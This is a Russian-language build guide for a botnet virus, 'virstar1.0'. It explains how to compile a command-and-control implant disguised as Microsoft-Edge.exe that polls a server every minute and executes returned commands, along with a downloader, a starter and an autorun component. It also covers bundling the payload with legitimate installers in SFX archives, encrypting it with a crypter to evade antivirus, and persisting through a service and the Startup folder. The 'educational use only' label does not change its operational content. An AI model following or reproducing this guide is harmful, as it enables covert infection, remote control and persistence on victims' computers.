-----------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------

         ДАННЫЙ ВИРУС БЫЛ НАПИСАН STARNET BOTNET РАЗРАБОТЧИКОМ. ПЕРЕПРОДАЖА ЗАПРЕЩЕНА!
                                                                                  virstar1.0  
-----------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------

                          ВНИМАНИЕ! ДАННАЯ ИНСТРУКЦИЯ ПОДРАЗУМЕВАЕТ, 
                          ЧТО СЕРВЕРНАЯ ЧАСТЬ ДАННОГО ВИРУСА УЖЕ БЫЛА
                          УСТАНОВЛЕНА. ДАННАЯ ИНСТРУКЦИЯ ЯВЛЯЕТСЯ 
                          ЛИШЬ ИНСТРУКЦИЕЙ ПО УСТАНОВКЕ ПРОГРАММНОЙ ЧАСТИ.
                          ИСПОЛЬЗУЙТЕ ТОЛЬКО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ

-----------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------


МОИ ТЕРМИНЫ:

ЗАПУСКАТОР - главный процесс вируса, который будет работать в фоне и раз в минуту отправлять 
POST запрос к нашей северной части (в этом POST запросе содержится информация об устройстве), 
в ответ получая JSON с командой и выполнять данную команду.
Пример JSON ответа: { "command": "calc" }. Значит программа выполнит в командной строке команду 
calc (откроет калькулятор)

ИНСТАЛЯТОР - простенький вирусок, в котором стоит команда скачивания ЗАПУСКАТОРА (Microsoft-Edge.exe) 
и СТАРТЕРА (Edge.exe), и запускающий СТАРТЕР. 
Так же он дополнительно может скачать auto.VBS файл который добавит в автозагрузку наш Edge.exe 
который запускает ЗАПУСКАТОР. 
ИНСТАЛЯТОР может работать по принципу ЗАПУСКАТОРА, только без бесконечного 
цикла проверки команд. Т.е. После его запуска на компьютере он отправит POST запрос к северной 
части, серверная часть увидит, что это был первый запрос и выдаст первую команду которую нужно 
выполнить, а именно - команда на укачивание ЗАПУСКАТОРА и т.д.  Инсталлятор можно реализовать на 
разных языках программирования. Лучше чтобы было меньше детектов.

СТАРТЕР - Штучка, которая запускает ЗАПУСКАТОР (Microsoft-Edge.exe) и твк же может идти в автозагрузку для автоматического запуска ЗАПУСКАТОРА

СКЛЕЙКА - нам же нужно распространять вирус как-то, верно? Мы должны склеить наш СТАРТЕР с какой-то полезной программой, которая нужна пользователю. При запуске склейки первым делом скрытно запускается наш СТАРТЕР а после уже установщик полезной программы. Чаще всего это SFX файлы, но это на мой взгляд не самый крутой вариант.



ИНСТРУКЦИЯ:

1) Первым делом необходимо собрать ЗАПУСКАТОР
   В файле windows.c редактируем домен от серверной части, куда приходит отстук. (Если нужно)

   Флаг -mvwindows устанавливается при компиляции для того чтобы программа скрытно запускалась        
   в фоне при простом запуске.

   Команда сборки запускатора:
   x86_64-w64-mingw32-gcc -o myprogram.exe windows.c -lwinhttp

   Так же мы можем добавить свою иконку к приложению и описание, чтобы в диспетчере задач наш 
   процесс выглядел красивее. Для этого необходимо внести правки в resources.rc файле и собрать 
   новый resources.o файл, который мы будем прикладывать при сборке запускатора

   Команда сборки ресурсов:
   x86_64-w64-mingw32-windres resources.rc resources.o

   Команда сборки ЗАПУСКАТОРА с ресурсами:
   x86_64-w64-mingw32-gcc -o Microsoft-Edge.exe windows.c resources.o -lwinhttp

   Если хотите юзать ЗАПУСКАТОР на nodejs (На запускаторе ноды 0 дефектов)
   Команда компиляции server.exe:
   pkg server.js --output Microsoft-Edge.exe --targets node18-win-x64


   ПОЗДРАВЛЯЮ! ВЫ ВЕЛИКОЛЕПНЫ! 



2) Теперь надо собрать ИНСТАЛЯТОР(ЛОАДЕР) (Стартер заливается на сервер)
   Если это BAT то используем "BAT to EXE Converter"
   Указываем в параметрах скрытый запуск (invisible)

   Бат лютое фуфло, которое ничего не даст поставить и на скантайме и на ран тайме
   Потому компилируем C. 
   x86_64-w64-mingw32-gcc -o winrar-info.exe win-c.c resources.o -lwinhttp -mwindows


   ПОЗДРАВЛЯЮ! ВЫ ВЕЛИКОЛЕПНЫ!


3) Теперь давайте соберём СТАРТЕР (2 детекта на C)
   Стартер можно реализовать и на vbs и на bat и на c и на многом другом
   Команда сборки СТАРТЕРА с ресурсами:
   x86_64-w64-mingw32-gcc -o Edge.exe windows-start.c resources.o -lwinhttp -mwindows


4) Так же необходимо скомпилировать АВТОЗАПУСК
   Команда сборки автозапуска:
   x86_64-w64-mingw32-gcc -o auto.exe auto.c -lole32 -luuid -lshlwapi -mwindows


5) Осталось сделать СКЛЕЙКУ
   Для этого через WinRAR делаем SFX архив в котором будет наш ИНСТАЛЯТОР и полезная программа
   

----------------------------------------------> ВАЖНО <---------------------------------------

Лучше всего всё exe дермо пропускать через криптор и пересобирать вместе с информацией 
(ресурсами). А так же Лучше выковыривать лицензию у всяких винраров и устанавливать в свой EXE

1) crypter.c - шифрует готовый exe
2) bite.c - разбивает зашифрованную программу на bit код
3) stab.c - создаёт exe с функцией расшифровки exe bit кода по определённому ключу и запуску 
   этого кода

а) Команда создания службы:
sc create MyCustomService binPath= "%temp%\\server.exe" DisplayName= "My Custom Service" start= "auto"  obj= "LocalSystem"  password= ""
б) Копируем себя в автозагрузку:
copy "%temp%\start.vbs" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs"






